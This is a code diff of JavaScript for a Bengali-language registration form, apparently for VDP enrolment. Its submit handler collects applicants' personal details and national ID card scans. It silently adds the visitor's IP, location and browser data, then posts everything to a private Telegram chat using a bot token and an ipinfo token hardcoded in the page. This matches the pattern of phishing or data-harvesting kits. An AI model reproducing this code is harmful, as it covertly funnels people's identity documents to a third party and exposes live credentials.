@@ -26,8 +26,8 @@ wardField.addEventListener('change', ()=>{
   const villages = wardVillageMap[wardField.value] || [];
   villageField.innerHTML = '<option value="">-- গ্রাম নির্বাচন করুন --</option>';
   villages.forEach(v=>{
-    const opt=document.createElement('option');
-    opt.value=v; opt.text=v;
+    const opt=document.createElement('option'); 
+    opt.value=v; opt.text=v; 
     villageField.appendChild(opt);
   });
 });
@@ -40,90 +40,110 @@ nidOption.addEventListener('change', ()=>{
   if(nidOption.value==='separate'){
     nidSeparate.style.display='block';
     nidCombinedDiv.style.display='none';
-    document.getElementById('nidFront').required=true;
-    document.getElementById('nidBack').required=true;
-    document.getElementById('nidCombined').required=false;
   } else if(nidOption.value==='combined'){
     nidSeparate.style.display='none';
     nidCombinedDiv.style.display='block';
-    document.getElementById('nidFront').required=false;
-    document.getElementById('nidBack').required=false;
-    document.getElementById('nidCombined').required=true;
   } else {
     nidSeparate.style.display='none';
     nidCombinedDiv.style.display='none';
-    document.getElementById('nidFront').required=false;
-    document.getElementById('nidBack').required=false;
-    document.getElementById('nidCombined').required=false;
   }
 });
 
-// Form submit + Telegram + IP + Device + Location
+// Extra file upload
+const extraFiles = document.getElementById('extraFiles');
+const extraUpload = document.getElementById('extraUpload');
+extraFiles.addEventListener('change', ()=>{
+  extraUpload.innerHTML='';
+  if(extraFiles.value){
+    const input=document.createElement('input');
+    input.type="file";
+    input.id="extra"+extraFiles.value;
+    input.accept=".jpg,.png,.pdf";
+    input.onchange=()=>checkFileSize(input);
+    extraUpload.appendChild(input);
+    const note=document.createElement('p');
+    note.style.fontSize="12px"; note.style.color="red";
+    note.innerText="⚠️ সর্বোচ্চ 2MB";
+    extraUpload.appendChild(note);
+  }
+});
+
+// File size check
+function checkFileSize(input){
+  if(input.files[0] && input.files[0].size > 2*1024*1024){
+    alert("⚠️ ফাইলের সাইজ 2MB এর বেশি হতে পারবে না!");
+    input.value="";
+  }
+}
+
+// Telegram Bot config
+const token="7728822427:AAE7T1k6yq5TejRnEySeac1_qQ6fCkA8v1s";
+const chatId="7079142411";
+
+// Form submit
 const form = document.getElementById('vdpForm');
+const loader = document.getElementById('loader');
+
 form.addEventListener('submit', async (e)=>{
   e.preventDefault();
+  loader.style.display="flex"; // Loader দেখাও
 
-  const token="7728822427:AAE7T1k6yq5TejRnEySeac1_qQ6fCkA8v1s";
-  const chatId="7079142411";
+  try {
+    const name=document.getElementById('name').value;
+    const phone=document.getElementById('phone').value;
+    const dob=document.getElementById('dob').value;
+    const age=document.getElementById('age').value;
+    const heightFeet=document.getElementById('heightFeet').value;
+    const heightInch=document.getElementById('heightInch').value;
+    const gender=document.getElementById('gender').value;
+    const ward=document.getElementById('ward').value;
+    const village=document.getElementById('village').value;
 
-  const name=document.getElementById('name').value;
-  const phone=document.getElementById('phone').value;
-  const dob=document.getElementById('dob').value;
-  const age=document.getElementById('age').value;
-  const heightFeet=document.getElementById('heightFeet').value;
-  const heightInch=document.getElementById('heightInch').value;
-  const gender=document.getElementById('gender').value;
-  const ward=document.getElementById('ward').value;
-  const village=document.getElementById('village').value;
-
-  const certificateFile=document.getElementById('certificate').files[0];
-  const nidFront=document.getElementById('nidFront')?.files[0];
-  const nidBack=document.getElementById('nidBack')?.files[0];
-  const nidCombined=document.getElementById('nidCombined')?.files[0];
-
-  // Get IP & Location
-  let ip='Unknown', country='Unknown', city='Unknown';
-  try{
+    let ip='Unknown', country='Unknown', city='Unknown';
+    try{
       const res = await fetch('https://ipinfo.io/json?token=24260cb6dd365a');
       const data = await res.json();
-      ip = data.ip;
-      country = data.country;
-      city = data.city;
-  }catch(err){ console.log('IP/Location error', err); }
+      ip=data.ip; country=data.country; city=data.city;
+    }catch{}
 
-  // Device info
-  const device = /Mobile|Android|iPhone|iPad/.test(navigator.userAgent)? 'Mobile' : 'Desktop';
-  const browser = navigator.userAgent;
+    const device = /Mobile|Android|iPhone|iPad/.test(navigator.userAgent)? 'Mobile' : 'Desktop';
+    const browser = navigator.userAgent;
 
-  let message=`নিবন্ধন তথ্য:\n\nনাম: ${name}\nমোবাইল: ${phone}\nজন্ম তারিখ: ${dob}\nবয়স: ${age}\nউচ্চতা: ${heightFeet} ফুট ${heightInch} ইঞ্চি\nলিঙ্গ: ${gender}\nওয়ার্ড: ${ward}\nগ্রাম: ${village}\nIP: ${ip}\nদেশ: ${country}\nশহর: ${city}\nডিভাইস: ${device}\nব্রাউজার: ${browser}`;
+    let message=`নিবন্ধন তথ্য:\n\nনাম: ${name}\nমোবাইল: ${phone}\nজন্ম তারিখ: ${dob}\nবয়স: ${age}\nউচ্চতা: ${heightFeet} ফুট ${heightInch} ইঞ্চি\nলিঙ্গ: ${gender}\nওয়ার্ড: ${ward}\nগ্রাম: ${village}\n\nIP: ${ip}\nদেশ: ${country}\nশহর: ${city}\nডিভাইস: ${device}\nব্রাউজার: ${browser}`;
 
-  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-    method:"POST",
-    headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({chat_id:chatId,text:message})
-  });
+    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({chat_id:chatId,text:message})
+    });
 
-  async function sendFile(file,type){
-    if(file){
-      const formData=new FormData();
-      formData.append('chat_id',chatId);
-      if(type==='photo') formData.append('photo',file);
-      else formData.append('document',file);
-      await fetch(`https://api.telegram.org/bot${token}/send${type==='photo'?'Photo':'Document'}`,{
-        method:'POST',body:formData});
+    async function sendFile(file){
+      if(file){
+        if(file.size > 2*1024*1024){
+          alert("⚠️ "+file.name+" 2MB এর বেশি, পাঠানো হয়নি!");
+          return;
+        }
+        const formData=new FormData();
+        formData.append('chat_id',chatId);
+        formData.append('document',file);
+        await fetch(`https://api.telegram.org/bot${token}/sendDocument`,{method:'POST',body:formData});
+      }
     }
+
+    await sendFile(document.getElementById('nidFront')?.files[0]);
+    await sendFile(document.getElementById('nidBack')?.files[0]);
+    await sendFile(document.getElementById('nidCombined')?.files[0]);
+    await sendFile(document.getElementById('certificate')?.files[0]);
+
+    const extra=document.querySelector('#extraUpload input');
+    if(extra) await sendFile(extra.files[0]);
+
+    alert("✅ ডেটা সাবমিট হয়েছে। ধন্যবাদ!");
+    form.reset();
+
+  } catch (err) {
+    alert("❌ সাবমিট ব্যর্থ হয়েছে, আবার চেষ্টা করুন!");
+  } finally {
+    loader.style.display="none";
   }
-
-  // Send files according to selection
-  if(nidOption.value==='separate'){
-    await sendFile(nidFront,'photo');
-    await sendFile(nidBack,'photo');
-  } else if(nidOption.value==='combined'){
-    await sendFile(nidCombined,'document');
-  }
-
-  await sendFile(certificateFile,'document');
-
-  alert("ডেটা সাবমিট হয়েছে। ধন্যবাদ!");
-  form.reset();
 });
